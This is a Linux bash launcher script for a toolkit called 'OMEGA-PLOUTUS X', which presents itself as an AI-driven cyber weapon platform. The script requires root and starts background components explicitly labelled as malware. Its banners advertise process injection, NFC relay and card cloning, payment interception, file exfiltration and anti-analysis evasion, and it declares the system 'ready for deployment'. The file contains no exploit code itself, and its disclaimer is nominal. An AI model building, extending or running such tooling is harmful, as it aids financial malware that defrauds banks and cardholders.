#!/bin/bash
# 🔥 OMEGA-PLOUTUS X - LINUX LAUNCH SCRIPT
# This shell script serves as the executable launcher for the Omega system on Linux

# Set colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${RED}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║    🔥 OMEGA-PLOUTUS X - CYBER WEAPON SYSTEM LAUNCHER 🔥          ║${NC}"
echo -e "${RED}║    The Ultimate AI-Driven Cyber Weapon Platform                  ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════════╝${NC}"
echo

# Check if we're running as root (Linux equivalent of administrator)
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}🚨 ROOT PRIVILEGES REQUIRED${NC}"
    echo
    echo "This system requires root privileges to function properly."
    echo "Please run with sudo: sudo ./launch_omega.sh"
    echo
    exit 1
fi

# Set working directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Display system information
echo -e "${BLUE}📊 SYSTEM STATUS:${NC}"
echo
echo "Launching OMEGA-PLOUTUS X Cyber Weapon System..."
echo
echo -e "${GREEN}🎯 ATTACK CAPABILITIES: 28 Different Attack Vectors${NC}"
echo -e "${GREEN}🧠 AI DECISION ENGINE: Advanced Machine Learning${NC}"
echo -e "${GREEN}💉 PROCESS INJECTION: Multiple Injection Techniques${NC}"
echo -e "${GREEN}💳 SMART CARD ATTACKS: APDU Command Manipulation${NC}"
echo -e "${GREEN}📡 NFC OPERATIONS: Capture, Relay, Replay, Cloning${NC}"
echo -e "${GREEN}💰 PAYMENT ATTACKS: Interception and Processing Control${NC}"
echo -e "${GREEN}🔍 FILE SYSTEM: Scanning, Analysis, Exfiltration${NC}"
echo -e "${GREEN}🛡️ DEFENSE EVASION: Polymorphic Code and Anti-Analysis${NC}"
echo

# Check if installed in /opt/omega (production) or running from source
if [[ -d "/opt/omega/venv" ]]; then
    # Production installation - use virtual environment
    INSTALL_DIR="/opt/omega"
    VENV_DIR="/opt/omega/venv"
    echo -e "${BLUE}📍 Using production installation at $INSTALL_DIR${NC}"
    cd "$INSTALL_DIR"
else
    # Development/source installation
    INSTALL_DIR="$(pwd)"
    echo -e "${BLUE}📍 Using development installation at $INSTALL_DIR${NC}"
fi

# Launch the Omega system
echo -e "${YELLOW}🚀 INITIATING OMEGA LAUNCH SEQUENCE...${NC}"
echo

# Function to check if process is running
check_process() {
    if pgrep -f "$1" > /dev/null; then
        return 0
    else
        return 1
    fi
}

# Start AI Server
echo "[1/4] Starting OMEGA AI Server..."
if [[ -d "$VENV_DIR" ]]; then
    # Use virtual environment
    source "$VENV_DIR/bin/activate"
    python3 omega_ai_server.py &
    AI_SERVER_PID=$!
    deactivate
else
    # Use system Python
    python3 omega_ai_server.py &
    AI_SERVER_PID=$!
fi
sleep 2

if check_process "omega_ai_server.py"; then
    echo -e "${GREEN}✅ OMEGA AI Server started successfully${NC}"
else
    echo -e "${RED}❌ Failed to start OMEGA AI Server${NC}"
fi

# Start Malware Launcher
echo "[2/4] Initializing Malware Components..."
if [[ -d "$VENV_DIR" ]]; then
    # Use virtual environment
    source "$VENV_DIR/bin/activate"
    python3 omega_ploutus_launcher.py &
    MALWARE_PID=$!
    deactivate
else
    # Use system Python
    python3 omega_ploutus_launcher.py &
    MALWARE_PID=$!
fi
sleep 2

if check_process "omega_ploutus_launcher.py"; then
    echo -e "${GREEN}✅ Malware Components initialized${NC}"
else
    echo -e "${RED}❌ Failed to initialize Malware Components${NC}"
fi

# Start Evolution Monitor
echo "[3/4] Activating Evolution System..."
if [[ -d "$VENV_DIR" ]]; then
    # Use virtual environment
    source "$VENV_DIR/bin/activate"
    python3 omega_evolution_monitor.py &
    EVOLUTION_PID=$!
    deactivate
else
    # Use system Python
    python3 omega_evolution_monitor.py &
    EVOLUTION_PID=$!
fi
sleep 2

if check_process "omega_evolution_monitor.py"; then
    echo -e "${GREEN}✅ Evolution System activated${NC}"
else
    echo -e "${RED}❌ Failed to activate Evolution System${NC}"
fi

# Display completion
echo "[4/4] OMEGA System Online!"
echo
echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║    ✅ OMEGA-PLOUTUS X SYSTEM SUCCESSFULLY LAUNCHED              ║${NC}"
echo -e "${GREEN}║                                                                ║${NC}"
echo -e "${GREEN}║    🎯 AI Decision Engine: ACTIVE                               ║${NC}"
echo -e "${GREEN}║    💉 Malware Components: ONLINE                               ║${NC}"
echo -e "${GREEN}║    🧠 Evolution System: RUNNING                                ║${NC}"
echo -e "${GREEN}║    📡 NFCGate Integration: READY                                ║${NC}"
echo -e "${GREEN}║                                                                ║${NC}"
echo -e "${GREEN}║    🚨 WARNING: This system is for educational/research use    ║${NC}"
echo -e "${GREEN}║    only. Unauthorized use may violate federal laws.            ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
echo

# Open the attack list documentation (Linux equivalent)
echo -e "${BLUE}📄 Opening Attack Documentation...${NC}"
if command -v xdg-open > /dev/null; then
    xdg-open "COMPLETE_ATTACK_LIST.md" &
elif command -v open > /dev/null; then
    open "COMPLETE_ATTACK_LIST.md" &
else
    echo "Could not open documentation automatically"
fi
sleep 1

# Display system monitoring
echo -e "${BLUE}📊 SYSTEM MONITORING:${NC}"
echo
echo "OMEGA AI Server: Running on port 31337"
echo "Malware Launcher: Active (PID: $MALWARE_PID)"
echo "Evolution Monitor: Tracking performance (PID: $EVOLUTION_PID)"
echo "Attack Capabilities: 28 vectors available"
echo
echo -e "${GREEN}🔄 The system is now fully operational and ready for deployment.${NC}"
echo -e "${GREEN}🧠 AI is analyzing targets and preparing optimal attack vectors.${NC}"
echo

# Function to cleanup on exit
cleanup() {
    echo
    echo -e "${YELLOW}🛑 Shutting down OMEGA-PLOUTUS X System...${NC}"

    # Kill all OMEGA processes
    pkill -f "omega_ai_server.py"
    pkill -f "omega_ploutus_launcher.py"
    pkill -f "omega_evolution_monitor.py"

    echo -e "${GREEN}✅ OMEGA System shutdown complete${NC}"
    exit 0
}

# Set trap for cleanup on exit
trap cleanup SIGINT SIGTERM

# Keep script running for monitoring
echo -e "${GREEN}🎯 OMEGA SYSTEM STATUS: ONLINE${NC}"
echo
echo "Press Ctrl+C to exit this launcher..."

# Keep running and show status
while true; do
    sleep 10

    # Check system status
    if check_process "omega_ai_server.py" && check_process "omega_ploutus_launcher.py" && check_process "omega_evolution_monitor.py"; then
        echo -e "$(date '+%H:%M:%S') - ${GREEN}🟢 ALL SYSTEMS OPERATIONAL${NC}"
    else
        echo -e "$(date '+%H:%M:%S') - ${RED}🔴 SYSTEM DEGRADED${NC}"
    fi
done
